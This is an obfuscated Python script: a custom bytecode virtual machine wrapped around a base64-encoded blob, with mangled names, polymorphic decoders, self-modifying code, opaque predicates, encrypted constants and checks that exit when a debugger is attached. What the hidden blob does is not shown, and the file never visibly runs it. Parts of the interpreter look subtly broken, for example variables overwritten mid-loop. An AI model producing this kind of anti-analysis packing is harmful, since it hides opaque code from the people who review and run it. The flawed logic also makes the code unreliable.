#!/usr/bin/env python3
def _qqeasm(_xizsl):
    return _xizsl % 9200 + 1

import hashlib as _vecrlj, hmac as _wniiz, base64 as _kfmetk, sys as _fzpqwo, zlib as _mxbksfpjr
_xizsl = 274488
_ppmyzlmls = """HVMo5QEmDl/vn08Txmy0yU9LBtal9rW1L79MKoy2vcgTW3Bk54sqhb/c8humB5Sis8eYskkyST5wMBIYYeLqwSS+0S8bklTSs7NKYLRA7Qvb8Of5oxtruVY0kkljf2k+BzSeedFz+weFPCIf2kmBNrJC3fN1BXKNV8jbscV7JYIhmCq86QIEnTpVVwAw4yjjDBR5ZOwKZo+LO6qpJveLkZ+9acEMgDAuyqoBK5r18AAw3sMNjmYAcSNCeXYWlTjNUh9OSaqalzm/S4ene2YoyNvooIXoYRNvgQIcJW51jIe01Pco7asy2LQADgf/depFiisoq7OVGkQqMgSq4bkdEDHAmbeAc2rwWRjS/SvwuzwOz9XYgY5zOwzwLEcjPbjP7bhgh5jCRLPl7g2IHn1fw8yWtiEgS40cZznAdRLri6oDiykuYgpZ7sTe8eJ1Otf1as9VrouJcH44iDCXVIqMTH8tPVF0uzcZQxtapG8BaiG1qoGJD5BZ7o2uH6SCDhiiIh58QELrkpn50StgUlZI7lIRZ+d1meIpCjjReiuayUeaxumN2yZIqR5PuVnicDoFKtwvUtjE7evFGJYm0yzEZFd42pF07DQF5nAUL/13D0tCBbTcd7SnmOSMw0mHxXRZrsw5ejryt+lhJn/eoVHXgqY4RKV+a0AFb7XiyrLNceZ3nw+u3ojkqrk53UvfOwNV1chT0gkSLrEKWBY5iekmbY6LGwWH9wVvElNpGsrtApULS6sCdPDGyZv1ALXImpnUzAN3KXeSWhuZNjm/2L1InS+Dt9xjaeblwUwH7P7TYI1mgHx6pbL3F0K/O+zAeAA1HCavBn9BxpaaBz4Bp/NqU2tgL0bChIItOVoOdc8WUrk7eHtGNmZ1AW27ZaflnSnHzc8MwjQIkyIY7GwIOwn1CDzMvhscVUvOoy7c4nYn"""
_rllvrkmjj = 3
_gxmcytdr = _qqeasm(_xizsl)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _pos = 256
    _flags = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _jwfupfmc():
    if _fzpqwo.gettrace() is not None:
        _fzpqwo.stderr.write('error: debugger detected\n'); _fzpqwo.exit(1)
